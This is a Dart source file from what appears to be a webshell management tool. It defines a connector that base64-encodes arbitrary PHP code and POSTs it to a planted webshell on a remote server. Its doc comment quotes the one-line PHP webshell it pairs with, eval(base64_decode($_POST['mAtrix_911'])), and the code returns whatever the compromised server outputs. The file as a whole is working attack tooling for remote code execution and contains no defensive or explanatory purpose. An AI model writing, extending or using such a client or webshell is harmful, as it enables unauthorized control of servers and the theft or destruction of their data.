import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import '../app/constants.dart';
import '../utils/encoding_utils.dart';
import 'php_eval_connector.dart';

/// `php_b64rot13_post.php`：`eval(base64_decode($_POST['mAtrix_911']))`
///
/// 与 PhpEvalConnector 能力完全相同，区别仅在传输编码：
///   - 参数名默认为 `mAtrix_911`（可通过 password 字段覆盖）
///   - 值为 base64 编码后的 PHP 代码
class PhpB64Rot13Connector extends PhpEvalConnector {
  PhpB64Rot13Connector(super.webshell);

  @override
  Future<String> sendPhpCode(String phpCode) async {
    try {
      final uri = Uri.parse(webshell.url);
      // password 字段在该连接器中表示 POST 参数名。
      final param = webshell.password?.isNotEmpty == true
          ? webshell.password!
          : AppConstants.defaultShellPassword;
      final encoded = base64.encode(utf8.encode(phpCode));

      final response = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: {param: encoded},
          )
          .timeout(const Duration(seconds: 25));

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes);
      }
      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 512 ? '${body.substring(0, 512)}...' : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }
}
